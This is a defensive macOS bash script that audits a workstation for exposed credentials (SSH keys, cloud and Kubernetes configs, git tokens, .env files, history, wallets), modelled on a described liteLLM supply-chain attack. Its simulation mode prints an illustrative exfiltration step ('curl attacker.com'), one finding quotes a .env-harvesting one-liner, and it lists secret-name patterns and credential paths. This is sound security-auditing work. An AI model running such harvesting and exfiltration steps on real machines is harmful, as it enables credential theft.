#!/bin/bash
# =============================================================================
# liteLLM Supply Chain Attack - Workstation Exposure Audit v2
# =============================================================================
#
# What this does:
#   Shows you exactly what a supply chain attacker would see if malicious code
#   ran as your user right now. Based on the TeamPCP liteLLM payload that
#   exfiltrated data from 500,000+ machines on March 24, 2026.
#
# What makes this different:
#   - Simulates the attacker's actual view, not just a file checklist
#   - Analyses real security properties (key algorithms, credential types, expiry)
#   - Shows process environment inheritance (why 'export' is dangerous)
#   - Explains WHY each finding matters with the specific attack it enables
#
# Safety:
#   - Runs ENTIRELY LOCALLY. No network calls. No data leaves your machine.
#   - Never displays secret VALUES. Only analyses metadata and properties.
#   - Read the source (~700 lines of bash) to verify.
#
# Usage:
#   chmod +x litellm-audit-v2.sh
#   ./litellm-audit-v2.sh              # Standard audit
#   ./litellm-audit-v2.sh --simulate   # Include attacker simulation mode
#
# =============================================================================

set -uo pipefail

# --- Arguments ---
SIMULATE_MODE=false
for arg in "$@"; do
    case "$arg" in
        --simulate) SIMULATE_MODE=true ;;
    esac
done

# --- Colours and symbols ---
RED='\033[0;31m'
YELLOW='\033[0;33m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
DIM='\033[2m'
ITALIC='\033[3m'
NC='\033[0m'

# --- Counters ---
TOTAL_CHECKS=0
CRITICAL_COUNT=0
EXPOSED_COUNT=0
WARNING_COUNT=0
SAFE_COUNT=0

# --- Findings storage ---
FINDINGS=""

add_finding() {
    local severity="$1"  # critical, exposed, warning, safe
    local category="$2"
    local title="$3"
    local detail="$4"
    local attack="$5"    # what attack this enables
    local fix="$6"

    TOTAL_CHECKS=$((TOTAL_CHECKS + 1))

    case "$severity" in
        critical)
            CRITICAL_COUNT=$((CRITICAL_COUNT + 1))
            printf "  ${RED}${BOLD}✗ CRITICAL${NC}  %s\n" "$title"
            ;;
        exposed)
            EXPOSED_COUNT=$((EXPOSED_COUNT + 1))
            printf "  ${RED}✗ EXPOSED${NC}   %s\n" "$title"
            ;;
        warning)
            WARNING_COUNT=$((WARNING_COUNT + 1))
            printf "  ${YELLOW}△ WARNING${NC}   %s\n" "$title"
            ;;
        safe)
            SAFE_COUNT=$((SAFE_COUNT + 1))
            printf "  ${GREEN}✓ SAFE${NC}      %s\n" "$title"
            ;;
    esac

    if [ -n "$detail" ]; then
        printf "              ${DIM}%s${NC}\n" "$detail"
    fi

    if [ "$severity" != "safe" ] && [ -n "$attack" ]; then
        printf "              ${ITALIC}${CYAN}Attack: %s${NC}\n" "$attack"
    fi

    if [ "$severity" != "safe" ] && [ -n "$fix" ]; then
        printf "              ${GREEN}Fix: %s${NC}\n" "$fix"
    fi

    printf "\n"
}

section_header() {
    printf "\n${BOLD}═══════════════════════════════════════════════════════════════${NC}\n"
    printf "${BOLD}  %s${NC}\n" "$1"
    printf "${BOLD}═══════════════════════════════════════════════════════════════${NC}\n\n"
}

subsection() {
    printf "  ${BOLD}--- %s ---${NC}\n\n" "$1"
}

# --- Platform detection ---
if [ "$(uname)" != "Darwin" ]; then
    printf "\nThis script is designed for macOS only.\n"
    printf "Linux and Windows are not currently supported.\n\n"
    exit 1
fi
IS_MACOS=true

# =============================================================================
# BEGIN AUDIT
# =============================================================================

printf "\n"
printf "${BOLD}╔═══════════════════════════════════════════════════════════════╗${NC}\n"
printf "${BOLD}║  Workstation Security Audit — macOS                          ║${NC}\n"
printf "${BOLD}║  Check your exposure to supply chain credential theft         ║${NC}\n"
printf "${BOLD}║  Inspired by the TeamPCP / liteLLM attack (March 2026)       ║${NC}\n"
printf "${BOLD}║                                                               ║${NC}\n"
printf "${BOLD}║  Runs entirely locally. No network calls. No data leaves      ║${NC}\n"
printf "${BOLD}║  your machine. Secret values are never read or displayed.     ║${NC}\n"
printf "${BOLD}║  Read the source to verify:                                   ║${NC}\n"
printf "${BOLD}║  github.com/Command-N/workstation-exposure-audit              ║${NC}\n"
printf "${BOLD}╚═══════════════════════════════════════════════════════════════╝${NC}\n"
printf "\n"
if [ "$SIMULATE_MODE" = true ]; then
    printf "  ${YELLOW}${BOLD}Attacker simulation mode enabled (--simulate)${NC}\n"
fi


# =============================================================================
# SECTION 1: ATTACKER SIMULATION — ENVIRONMENT VARIABLE INHERITANCE
# =============================================================================
# The malware ran `printenv` to capture everything. This section shows
# exactly what that would yield and WHY it works.

section_header "1. ENVIRONMENT VARIABLES — What 'printenv' Would Capture"

# Count total environment variables
TOTAL_ENV=$(env | wc -l | tr -d ' ')
printf "  ${DIM}Your current shell has ${BOLD}%s${NC}${DIM} environment variables.${NC}\n" "$TOTAL_ENV"
printf "  ${DIM}Every one of them is inherited by child processes (pip, python, node).${NC}\n"
printf "  ${DIM}The liteLLM malware ran 'printenv' to capture all of them.${NC}\n\n"

# Check for secret-like environment variables — names only, never values
SECRET_PATTERNS="API_KEY\|_SECRET\|_TOKEN\|PASSWORD\|CREDENTIAL\|PRIVATE_KEY\|_AUTH\|_PWD\|_PASS\|DATABASE_URL\|MONGO_URI\|REDIS_URL\|WEBHOOK"
EXPOSED_VARS=$(env | grep -iE "^[^=]*(${SECRET_PATTERNS})" 2>/dev/null | sed 's/=.*//' | sort || true)

if [ -n "$EXPOSED_VARS" ]; then
    VAR_COUNT=$(echo "$EXPOSED_VARS" | wc -l | tr -d ' ')
    add_finding "exposed" "env" \
        "$VAR_COUNT secret-like variable(s) in current environment" \
        "These are in memory right now, inherited by every child process:" \
        "Any pip install, npx, or subprocess reads these via os.environ" \
        "Use a credential manager (1Password CLI, aws-vault) for per-process injection"

    while IFS= read -r var; do
        # Show variable name and value length only, never the value itself
        val_length=$(env | grep "^${var}=" | sed "s/^${var}=//" | wc -c | tr -d ' ')
        printf "              ${RED}%-30s${NC} ${DIM}(%s chars)${NC}\n" "$var" "$val_length"
    done <<< "$EXPOSED_VARS"
    printf "\n"
else
    add_finding "safe" "env" \
        "No secret-like variables in current environment" \
        "Checked for: API_KEY, SECRET, TOKEN, PASSWORD, CREDENTIAL, etc." \
        "" ""
fi

# Check shell config files for persistent exports
subsection "Persistent exports in shell config files"

SHELL_CONFIG_ISSUE=false
for shell_file in "$HOME/.zshrc" "$HOME/.zshenv" "$HOME/.bash_profile" "$HOME/.bashrc" "$HOME/.profile"; do
    if [ -f "$shell_file" ]; then
        # Find export lines with secret-like names, show only the variable names
        EXPORTED_SECRETS=$(grep -inE "^[[:space:]]*export[[:space:]]+[A-Za-z_]*(API_KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL|PRIVATE_KEY|AUTH_|_PWD|_PASS)" "$shell_file" 2>/dev/null | sed 's/=.*//' | sed 's/.*export[[:space:]]*//' || true)

        if [ -n "$EXPORTED_SECRETS" ]; then
            SHELL_CONFIG_ISSUE=true
            add_finding "critical" "env" \
                "$(basename "$shell_file") exports secrets that persist across all sessions" \
                "$shell_file" \
                "Every terminal you open, every process you run, forever has these secrets" \
                "Remove these lines. Use 'op run' or 'aws-vault exec' for per-process injection"

            while IFS= read -r varname; do
                printf "              ${RED}export %s=...${NC}\n" "$varname"
            done <<< "$EXPORTED_SECRETS"
            printf "\n"
        fi
    fi
done

if [ "$SHELL_CONFIG_ISSUE" = false ]; then
    add_finding "safe" "env" \
        "No shell config files export secret-like variables" \
        "Checked: .zshrc, .zshenv, .bash_profile, .bashrc, .profile" \
        "" ""
fi

# Process inheritance demonstration (simulation mode only)
if [ "$SIMULATE_MODE" = true ]; then
    subsection "Attacker simulation: process environment inheritance"

    printf "  ${CYAN}${BOLD}How the attack works:${NC}\n\n"
    printf "  ${DIM}You type:${NC}  pip install some-package\n"
    printf "  ${DIM}pip runs:${NC}  python setup.py install\n"
    printf "  ${DIM}setup.py:${NC}  import os; secrets = dict(os.environ)  ${RED}# ← this is the attack${NC}\n\n"

    printf "  ${CYAN}The malicious code doesn't hack anything. It reads its own memory.${NC}\n"
    printf "  ${CYAN}The secrets were given to it by the kernel when the process was created.${NC}\n\n"

    printf "  ${DIM}Your current process tree inheriting the environment:${NC}\n\n"

    # Show abbreviated process tree
    CURRENT_PID=$$
    printf "              ${DIM}Terminal (zsh/bash)${NC}\n"
    printf "              ${DIM}  └─ this script (PID %s)${NC}\n" "$CURRENT_PID"
    printf "              ${DIM}       └─ pip install some-package${NC}\n"
    printf "              ${DIM}            └─ python setup.py  ${RED}← inherits ALL %s env vars${NC}\n" "$TOTAL_ENV"
    printf "              ${DIM}                 └─ curl attacker.com  ${RED}← sends them all${NC}\n\n"
fi


# =============================================================================
# SECTION 2: SSH KEYS — Deep Analysis
# =============================================================================
# The malware targeted: id_rsa, id_ed25519, id_ecdsa, id_dsa

section_header "2. SSH KEYS — Authentication & Key Analysis"

SSH_KEY_FOUND=false
for keytype in id_rsa id_ed25519 id_ecdsa id_dsa; do
    keypath="$HOME/.ssh/$keytype"
    if [ -f "$keypath" ]; then
        SSH_KEY_FOUND=true

        # Determine key algorithm and strength
        key_algo=""
        key_bits=""
        key_assessment=""

        case "$keytype" in
            id_dsa)
                key_algo="DSA"
                key_bits="1024"
                key_assessment="${RED}DEPRECATED — DSA is no longer considered secure${NC}"
                ;;
            id_rsa)
                key_algo="RSA"
                # Extract bit length from the key
                key_bits=$(ssh-keygen -l -f "$keypath" 2>/dev/null | awk '{print $1}' || echo "unknown")
                if [ "$key_bits" != "unknown" ] && [ "$key_bits" -lt 3072 ] 2>/dev/null; then
                    key_assessment="${YELLOW}Consider upgrading — NIST recommends 3072+ bits for RSA${NC}"
                else
                    key_assessment="${GREEN}Good key length${NC}"
                fi
                ;;
            id_ecdsa)
                key_algo="ECDSA"
                key_bits=$(ssh-keygen -l -f "$keypath" 2>/dev/null | awk '{print $1}' || echo "unknown")
                key_assessment="${GREEN}Modern algorithm${NC}"
                ;;
            id_ed25519)
                key_algo="Ed25519"
                key_bits="256"
                key_assessment="${GREEN}Best current choice — fast, secure, short keys${NC}"
                ;;
        esac

        # Check passphrase protection
        if ssh-keygen -y -P "" -f "$keypath" >/dev/null 2>&1; then
            # No passphrase — exposed
            add_finding "critical" "ssh" \
                "SSH key $keytype ($key_algo, $key_bits-bit) has NO PASSPHRASE" \
                "$keypath — Algorithm: $key_assessment" \
                "Attacker copies this file and has immediate access to every server with your public key" \
                "ssh-keygen -p -f $keypath (adds a passphrase to encrypt the key at rest)"

            # Count how many servers this key could access
            if [ -f "$HOME/.ssh/known_hosts" ]; then
                host_count=$(wc -l < "$HOME/.ssh/known_hosts" 2>/dev/null | tr -d ' ')
                printf "              ${DIM}Your known_hosts has %s entries — potential blast radius${NC}\n\n" "$host_count"
            fi
        else
            add_finding "safe" "ssh" \
                "SSH key $keytype ($key_algo, $key_bits-bit) is passphrase-protected" \
                "$keypath — stolen file is ciphertext, unusable without passphrase" \
                "" ""
        fi
    fi
done

if [ "$SSH_KEY_FOUND" = false ]; then
    add_finding "safe" "ssh" \
        "No SSH private keys found" \
        "Checked: id_rsa, id_ed25519, id_ecdsa, id_dsa" \
        "" ""
fi

# macOS Keychain integration check
if [ "$IS_MACOS" = true ]; then
    subsection "macOS Keychain integration"

    if [ -f "$HOME/.ssh/config" ]; then
        HAS_KEYCHAIN=$(grep -ci "UseKeychain" "$HOME/.ssh/config" 2>/dev/null || echo "0")
        HAS_ADDKEYS=$(grep -ci "AddKeysToAgent" "$HOME/.ssh/config" 2>/dev/null || echo "0")

        if [ "$HAS_KEYCHAIN" -gt 0 ] && [ "$HAS_ADDKEYS" -gt 0 ]; then
            add_finding "safe" "ssh" \
                "SSH config has Keychain integration (UseKeychain + AddKeysToAgent)" \
                "Passphrase stored in Keychain, protected by per-app ACL" \
                "" ""
        else
            add_finding "warning" "ssh" \
                "SSH config missing Keychain integration" \
                "Without this, you retype your passphrase on every connection" \
                "Inconvenience leads to removing passphrases, which removes the protection" \
                "Add 'UseKeychain yes' and 'AddKeysToAgent yes' under 'Host *' in ~/.ssh/config"
        fi
    else
        add_finding "warning" "ssh" \
            "No SSH config file — Keychain integration not configured" \
            "" \
            "Without Keychain integration, passphrase friction leads to unprotected keys" \
            "Create ~/.ssh/config with Host *, AddKeysToAgent yes, UseKeychain yes"
    fi
fi

# Check authorized_keys (reveals who can log INTO this machine)
if [ -f "$HOME/.ssh/authorized_keys" ]; then
    auth_key_count=$(grep -c "^ssh-\|^ecdsa-" "$HOME/.ssh/authorized_keys" 2>/dev/null || echo "0")
    add_finding "warning" "ssh" \
        "authorized_keys exists ($auth_key_count key(s) can log into this machine)" \
        "$HOME/.ssh/authorized_keys — reveals your access relationships" \
        "Attacker learns which other machines/people have access to this one" \
        ""
fi


# =============================================================================
# SECTION 3: CLOUD PROVIDER CREDENTIALS — Deep Analysis
# =============================================================================

section_header "3. CLOUD PROVIDER CREDENTIALS"

# --- AWS ---
subsection "AWS (Amazon Web Services)"

if [ -f "$HOME/.aws/credentials" ]; then
    # Analyse credential type without reading secret values
    # Check for session tokens (indicates short-lived credentials)
    HAS_SESSION_TOKEN=$(grep -c "aws_session_token" "$HOME/.aws/credentials" 2>/dev/null || echo "0")
    PROFILE_COUNT=$(grep -c "^\[" "$HOME/.aws/credentials" 2>/dev/null || echo "0")

    # Check for key ID pattern — AKIA = long-lived, ASIA = temporary session
    HAS_LONG_LIVED=$(grep -c "AKIA" "$HOME/.aws/credentials" 2>/dev/null || echo "0")
    HAS_TEMP=$(grep -c "ASIA" "$HOME/.aws/credentials" 2>/dev/null || echo "0")

    if [ "$HAS_LONG_LIVED" -gt 0 ]; then
        add_finding "critical" "cloud" \
            "AWS credentials file contains $PROFILE_COUNT profile(s) with LONG-LIVED keys (AKIA...)" \
            "$HOME/.aws/credentials — these keys never expire until manually rotated" \
            "Attacker gets persistent AWS access. They can create new IAM users, launch EC2, access S3." \
            "Use 'aws sso configure' for short-lived tokens or 'aws-vault' to store keys in Keychain"
    elif [ "$HAS_TEMP" -gt 0 ] && [ "$HAS_SESSION_TOKEN" -gt 0 ]; then
        add_finding "warning" "cloud" \
            "AWS credentials file has temporary session credentials (ASIA...)" \
            "$HOME/.aws/credentials — $PROFILE_COUNT profile(s), credentials will expire" \
            "Attacker gets time-limited access, but can act quickly within the session" \
            "Consider 'aws-vault' which stores long-lived keys in Keychain and auto-generates sessions"
    else
        add_finding "exposed" "cloud" \
            "AWS credentials file exists with $PROFILE_COUNT profile(s)" \
            "$HOME/.aws/credentials — credential type could not be determined" \
            "Attacker reads plaintext access keys and can authenticate as you to AWS" \
            "Use 'aws sso configure' or 'aws-vault' to avoid plaintext credential files"
    fi
else
    add_finding "safe" "cloud" \
        "No AWS credentials file" \
        "$HOME/.aws/credentials not found" \
        "" ""
fi

if [ -f "$HOME/.aws/config" ]; then
    # Check if using SSO (the safer pattern)
    HAS_SSO=$(grep -c "sso_" "$HOME/.aws/config" 2>/dev/null || echo "0")
    if [ "$HAS_SSO" -gt 0 ]; then
        add_finding "safe" "cloud" \
            "AWS config uses SSO (short-lived credential pattern)" \
            "$HOME/.aws/config — SSO sessions expire and require browser re-authentication" \
            "" ""
    else
        add_finding "warning" "cloud" \
            "AWS config exists but does not use SSO" \
            "$HOME/.aws/config — may contain region/role config (not secrets, but useful recon)" \
            "Reveals which AWS regions and accounts you work with" \
            ""
    fi
fi

# --- GCP ---
subsection "GCP (Google Cloud Platform)"

if [ -f "$HOME/.config/gcloud/application_default_credentials.json" ]; then
    # Check credential type
    CRED_TYPE=$(grep -o '"type"[[:space:]]*:[[:space:]]*"[^"]*"' "$HOME/.config/gcloud/application_default_credentials.json" 2>/dev/null | head -1 | sed 's/.*"type"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/' || echo "unknown")

    case "$CRED_TYPE" in
        authorized_user)
            add_finding "exposed" "cloud" \
                "GCP application default credentials (type: authorized_user)" \
                "$HOME/.config/gcloud/application_default_credentials.json" \
                "Contains OAuth refresh token. Attacker can generate new access tokens indefinitely" \
                "Use 'gcloud auth application-default revoke' when not needed, use service accounts for apps"
            ;;
        service_account)
            add_finding "critical" "cloud" \
                "GCP service account key on disk (type: service_account)" \
                "$HOME/.config/gcloud/application_default_credentials.json" \
                "Service account keys don't expire. Attacker gets persistent GCP access." \
                "Use Workload Identity Federation instead of downloading key files"
            ;;
        *)
            add_finding "exposed" "cloud" \
                "GCP application default credentials (type: $CRED_TYPE)" \
                "$HOME/.config/gcloud/application_default_credentials.json" \
                "Attacker gains GCP access via stored credentials" \
                "Review and rotate: gcloud auth application-default revoke"
            ;;
    esac
else
    add_finding "safe" "cloud" \
        "No GCP application default credentials" \
        "$HOME/.config/gcloud/application_default_credentials.json not found" \
        "" ""
fi

# --- Azure ---
subsection "Azure"

if [ -d "$HOME/.azure" ]; then
    AZURE_FILES=$(find "$HOME/.azure" -type f -name "*.json" 2>/dev/null | wc -l | tr -d ' ')
    if [ "$AZURE_FILES" -gt 0 ]; then
        add_finding "exposed" "cloud" \
            "Azure CLI credentials directory ($AZURE_FILES JSON files)" \
            "$HOME/.azure/" \
            "May contain access tokens, refresh tokens, and subscription details" \
            "Use 'az logout' when not actively needed, use managed identities for apps"
    else
        add_finding "safe" "cloud" \
            "Azure directory exists but contains no JSON credential files" \
            "" "" ""
    fi
else
    add_finding "safe" "cloud" \
        "No Azure credentials directory" \
        "$HOME/.azure/ not found" \
        "" ""
fi


# =============================================================================
# SECTION 4: KUBERNETES — The Lateral Movement Vector
# =============================================================================
# The liteLLM malware didn't just steal k8s creds — it used them to read
# ALL cluster secrets and deploy privileged pods on every node.

section_header "4. KUBERNETES — Lateral Movement Vector"

printf "  ${DIM}The liteLLM malware used stolen k8s configs to:${NC}\n"
printf "  ${DIM}  1. Read ALL secrets across ALL namespaces${NC}\n"
printf "  ${DIM}  2. Deploy privileged pods on every node in the cluster${NC}\n"
printf "  ${DIM}  3. Mount the host filesystem and install persistent backdoors${NC}\n\n"

if [ -f "$HOME/.kube/config" ]; then
    # Count clusters and contexts
    CLUSTER_COUNT=$(grep -c "^\- cluster:" "$HOME/.kube/config" 2>/dev/null || grep -c "server:" "$HOME/.kube/config" 2>/dev/null || echo "0")
    CONTEXT_COUNT=$(grep -c "^\- context:" "$HOME/.kube/config" 2>/dev/null || echo "0")

    # Check for client certificates vs token auth
    HAS_CLIENT_CERT=$(grep -c "client-certificate" "$HOME/.kube/config" 2>/dev/null || echo "0")
    HAS_TOKEN=$(grep -c "token:" "$HOME/.kube/config" 2>/dev/null || echo "0")
    HAS_EXEC=$(grep -c "exec:" "$HOME/.kube/config" 2>/dev/null || echo "0")

    AUTH_METHOD="unknown"
    if [ "$HAS_EXEC" -gt 0 ]; then
        AUTH_METHOD="exec-based (likely short-lived tokens — better)"
    elif [ "$HAS_TOKEN" -gt 0 ]; then
        AUTH_METHOD="static token (long-lived — dangerous)"
    elif [ "$HAS_CLIENT_CERT" -gt 0 ]; then
        AUTH_METHOD="client certificate"
    fi

    add_finding "critical" "k8s" \
        "Kubernetes config: ~$CLUSTER_COUNT cluster(s), auth method: $AUTH_METHOD" \
        "$HOME/.kube/config" \
        "Attacker authenticates to your clusters, reads secrets, deploys malicious pods" \
        "Use short-lived exec-based auth (aws eks, gcloud, oidc-login). Scope RBAC narrowly."
else
    add_finding "safe" "k8s" \
        "No Kubernetes configuration" \
        "$HOME/.kube/config not found" \
        "" ""
fi

# Service account token (container/CI environments)
if [ -f "/var/run/secrets/kubernetes.io/serviceaccount/token" ]; then
    add_finding "critical" "k8s" \
        "Kubernetes service account token mounted in this environment" \
        "/var/run/secrets/kubernetes.io/serviceaccount/token" \
        "The liteLLM malware used these to read all cluster secrets and deploy backdoor pods" \
        "Use automountServiceAccountToken: false unless the pod actually needs k8s API access"
fi


# =============================================================================
# SECTION 5: GIT CREDENTIALS
# =============================================================================

section_header "5. GIT CREDENTIALS"

if [ -f "$HOME/.git-credentials" ]; then
    # Count stored credentials without revealing them
    CRED_COUNT=$(wc -l < "$HOME/.git-credentials" 2>/dev/null | tr -d ' ')
    # Check which hosts are stored (domain only, no tokens)
    HOSTS=$(grep -oE "https?://[^:@/]+" "$HOME/.git-credentials" 2>/dev/null | sort -u || true)

    add_finding "critical" "git" \
        "Git credential-store: $CRED_COUNT plaintext credential(s)" \
        "$HOME/.git-credentials — passwords/tokens stored unencrypted on disk" \
        "Attacker gets direct access to your repositories, can push malicious code" \
        "git config --global credential.helper osxkeychain && rm ~/.git-credentials"

    if [ -n "$HOSTS" ]; then
        printf "              ${DIM}Hosts with stored credentials:${NC}\n"
        while IFS= read -r host; do
            printf "              ${RED}  %s${NC}\n" "$host"
        done <<< "$HOSTS"
        printf "\n"
    fi
else
    add_finding "safe" "git" \
        "No plaintext git credentials file" \
        "$HOME/.git-credentials not found" \
        "" ""
fi

# Check credential helper
if command -v git >/dev/null 2>&1; then
    CRED_HELPER=$(git config --global credential.helper 2>/dev/null || echo "")
    case "$CRED_HELPER" in
        osxkeychain)
            add_finding "safe" "git" \
                "Git uses macOS Keychain for credentials (per-app ACL protected)" \
                "credential.helper = osxkeychain" \
                "" ""
            ;;
        store)
            add_finding "critical" "git" \
                "Git credential helper is 'store' (writes plaintext to disk)" \
                "credential.helper = store" \
                "Every git push/pull writes your token in cleartext to ~/.git-credentials" \
                "git config --global credential.helper osxkeychain"
            ;;
        "")
            add_finding "warning" "git" \
                "No git credential helper configured" \
                "Git will prompt for credentials each time (or you may be using SSH instead)" \
                "" \
                "Consider: git config --global credential.helper osxkeychain"
            ;;
        *)
            add_finding "safe" "git" \
                "Git credential helper: $CRED_HELPER" \
                "" "" ""
            ;;
    esac
fi

# GitHub CLI credentials
GH_HOSTS="$HOME/.config/gh/hosts.yml"
if [ -f "$GH_HOSTS" ]; then
    # Check if the file contains an actual token value (not just blank metadata)
    if grep -qE "^\s*(oauth_token|token):\s*.+" "$GH_HOSTS" 2>/dev/null; then
        add_finding "exposed" "git" \
            "GitHub CLI token stored in plaintext ($GH_HOSTS)" \
            "Token grants access to your GitHub repos — scope depends on how you authenticated" \
            "Attacker can push code, modify Actions workflows, and access private repos" \
            "Re-run 'gh auth logout && gh auth login' and choose Keychain for credential storage"
    else
        add_finding "safe" "git" \
            "GitHub CLI config exists but token is stored in macOS Keychain (not plaintext)" \
            "$GH_HOSTS — token field is blank, credential is Keychain-protected" \
            "" ""
    fi
else
    add_finding "safe" "git" \
        "No GitHub CLI credentials file" \
        "$GH_HOSTS not found" \
        "" ""
fi


# =============================================================================
# SECTION 6: DOCKER CONFIGURATION
# =============================================================================

section_header "6. DOCKER CONFIGURATION"

for docker_config in "$HOME/.docker/config.json" "/kaniko/.docker/config.json" "/root/.docker/config.json"; do
    if [ -f "$docker_config" ]; then
        # Check if it uses credStore (Keychain/credential helper) or has inline auths
        HAS_CRED_STORE=$(grep -c "credsStore\|credStore" "$docker_config" 2>/dev/null || echo "0")
        HAS_INLINE_AUTH=$(grep -c '"auth"' "$docker_config" 2>/dev/null || echo "0")

        if [ "$HAS_INLINE_AUTH" -gt 0 ] && [ "$HAS_CRED_STORE" -eq 0 ]; then
            add_finding "exposed" "docker" \
                "Docker config has inline auth tokens (base64-encoded, trivially decodable)" \
                "$docker_config" \
                "Attacker decodes the auth field and pushes malicious images to your registries" \
                "Configure Docker to use credential store: docker-credential-osxkeychain"
        elif [ "$HAS_CRED_STORE" -gt 0 ]; then
            add_finding "safe" "docker" \
                "Docker config uses a credential store (not inline tokens)" \
                "$docker_config" \
                "" ""
        else
            add_finding "warning" "docker" \
                "Docker config exists (no inline auth found, but may contain config details)" \
                "$docker_config" \
                "" ""
        fi
    fi
done


# =============================================================================
# SECTION 7: .env FILES — The Scattered Secrets
# =============================================================================

section_header "7. .env FILES — Scattered Secrets"

printf "  ${DIM}The malware recursively searched for .env files, which commonly${NC}\n"
printf "  ${DIM}contain API keys, database URLs, and other secrets.${NC}\n\n"

ENV_FILES=$(find "$HOME" -maxdepth 5 -name ".env" -type f -not -path "*/node_modules/*" -not -path "*/.git/*" 2>/dev/null | head -25 || true)

if [ -n "$ENV_FILES" ]; then
    ENV_COUNT=$(echo "$ENV_FILES" | wc -l | tr -d ' ')

    add_finding "exposed" "env-files" \
        "$ENV_COUNT .env file(s) found in your home directory tree" \
        "Each may contain API keys, database passwords, webhook URLs" \
        "Attacker runs: find ~ -name .env -exec cat {} + (grabs everything in seconds)" \
        "Use 1Password CLI with .env.template references instead of real values"

    while IFS= read -r envfile; do
        # Count lines that look like secrets (KEY=value patterns)
        SECRET_LINES=$(grep -cE "^[A-Z_]*(KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL|AUTH|PWD|PASS)=" "$envfile" 2>/dev/null || echo "0")
        # Check if it's in .gitignore
        ENV_DIR=$(dirname "$envfile")
        IN_GITIGNORE="unknown"
        if [ -f "$ENV_DIR/.gitignore" ]; then
            if grep -q "\.env" "$ENV_DIR/.gitignore" 2>/dev/null; then
                IN_GITIGNORE="${GREEN}yes${NC}"
            else
                IN_GITIGNORE="${RED}NO${NC}"
            fi
        fi

        FILE_SIZE=$(wc -c < "$envfile" 2>/dev/null | tr -d ' ')
        printf "              ${DIM}%s${NC}\n" "$envfile"
        printf "              ${DIM}  %s secret-like lines, %s bytes, in .gitignore: %b${NC}\n\n" "$SECRET_LINES" "$FILE_SIZE" "$IN_GITIGNORE"
    done <<< "$ENV_FILES"
else
    add_finding "safe" "env-files" \
        "No .env files found (searched to depth 5)" \
        "" "" ""
fi


# =============================================================================
# SECTION 8: SHELL HISTORY — The Accidental Secret Store
# =============================================================================

section_header "8. SHELL HISTORY — Accidental Secrets"

printf "  ${DIM}If you ever typed a secret on the command line, it's probably still${NC}\n"
printf "  ${DIM}here. The malware exfiltrated all history files.${NC}\n\n"

for hist_file in "$HOME/.zsh_history" "$HOME/.bash_history" "$HOME/.sh_history"; do
    if [ -f "$hist_file" ]; then
        LINE_COUNT=$(wc -l < "$hist_file" 2>/dev/null | tr -d ' ')
        FILE_SIZE=$(du -h "$hist_file" 2>/dev/null | awk '{print $1}' || echo "unknown")

        # Check for secret-like content in history (patterns only, never values)
        SECRET_CMDS=$(grep -ciE "(export.*(_KEY|_SECRET|_TOKEN|PASSWORD)=|curl.*-H.*[Aa]uth|mysql.*-p|psql.*password)" "$hist_file" 2>/dev/null || echo "0")

        if [ "$SECRET_CMDS" -gt 0 ]; then
            add_finding "exposed" "history" \
                "$(basename "$hist_file"): $LINE_COUNT lines ($FILE_SIZE), ~$SECRET_CMDS lines contain secret patterns" \
                "$hist_file" \
                "Attacker greps history for API keys, passwords, auth headers, connection strings" \
                "Enable HIST_IGNORE_SPACE in zsh (prefix sensitive commands with a space to exclude)"
        else
            add_finding "warning" "history" \
                "$(basename "$hist_file"): $LINE_COUNT lines ($FILE_SIZE), no obvious secret patterns" \
                "$hist_file — still reveals your tools, workflows, and infrastructure" \
                "Useful reconnaissance for targeted follow-up attacks" \
                ""
        fi
    fi
done

# Database history
for db_hist in "$HOME/.mysql_history" "$HOME/.psql_history" "$HOME/.rediscli_history"; do
    if [ -f "$db_hist" ]; then
        add_finding "warning" "history" \
            "$(basename "$db_hist") exists (may contain queries with embedded credentials)" \
            "$db_hist" \
            "Database history can contain INSERT/UPDATE statements with passwords or PII" \
            ""
    fi
done


# =============================================================================
# SECTION 9: PACKAGE MANAGER & SERVICE CREDENTIALS
# =============================================================================

section_header "9. PACKAGE MANAGER & SERVICE CREDENTIALS"

declare -a PM_FILES=(
    "$HOME/.npmrc|npm config|May contain registry auth tokens (//registry.npmjs.org/:_authToken)"
    "$HOME/.vault-token|HashiCorp Vault token|Single-line plaintext token granting Vault access"
    "$HOME/.netrc|netrc file|Plaintext username:password pairs for FTP/HTTP services"
    "$HOME/.my.cnf|MySQL config|May contain [client] password= for database access"
    "$HOME/.pgpass|PostgreSQL password file|hostname:port:database:username:password format"
    "$HOME/.mongorc.js|MongoDB shell config|May contain authentication commands"
)

for entry in "${PM_FILES[@]}"; do
    IFS='|' read -r filepath name description <<< "$entry"
    if [ -f "$filepath" ]; then
        add_finding "exposed" "pkg" \
            "$name exists" \
            "$filepath — $description" \
            "Attacker reads credentials for the associated service" \
            "Move credentials to a secrets manager or use short-lived auth"
    else
        add_finding "safe" "pkg" \
            "$name not found" \
            "$filepath" \
            "" ""
    fi
done


# =============================================================================
# SECTION 10: CRYPTOCURRENCY WALLETS
# =============================================================================

section_header "10. CRYPTOCURRENCY WALLETS"

printf "  ${DIM}The malware searched for wallet files across 10 cryptocurrencies.${NC}\n\n"

WALLET_FOUND=false
declare -a WALLETS=(
    "$HOME/.bitcoin|Bitcoin"
    "$HOME/.litecoin|Litecoin"
    "$HOME/.dogecoin|Dogecoin"
    "$HOME/.zcash|Zcash"
    "$HOME/.dashcore|Dash"
    "$HOME/.ripple|Ripple"
    "$HOME/.bitmonero|Monero"
    "$HOME/.ethereum/keystore|Ethereum"
    "$HOME/.cardano|Cardano"
    "$HOME/.config/solana|Solana"
)

for entry in "${WALLETS[@]}"; do
    IFS='|' read -r dirpath name <<< "$entry"
    if [ -d "$dirpath" ]; then
        file_count=$(find "$dirpath" -type f 2>/dev/null | wc -l | tr -d ' ')
        if [ "$file_count" -gt 0 ]; then
            WALLET_FOUND=true
            add_finding "critical" "crypto" \
                "$name wallet directory ($file_count files)" \
                "$dirpath" \
                "Attacker can steal wallet private keys and drain funds immediately" \
                "Use hardware wallets. Never store significant funds in hot wallets on dev machines."
        fi
    fi
done

if [ "$WALLET_FOUND" = false ]; then
    TOTAL_CHECKS=$((TOTAL_CHECKS + 1))
    SAFE_COUNT=$((SAFE_COUNT + 1))
    printf "  ${GREEN}✓ SAFE${NC}      No cryptocurrency wallet directories found\n"
    printf "              ${DIM}Checked: Bitcoin, Litecoin, Dogecoin, Zcash, Dash, Ripple,${NC}\n"
    printf "              ${DIM}Monero, Ethereum, Cardano, Solana${NC}\n\n"
fi


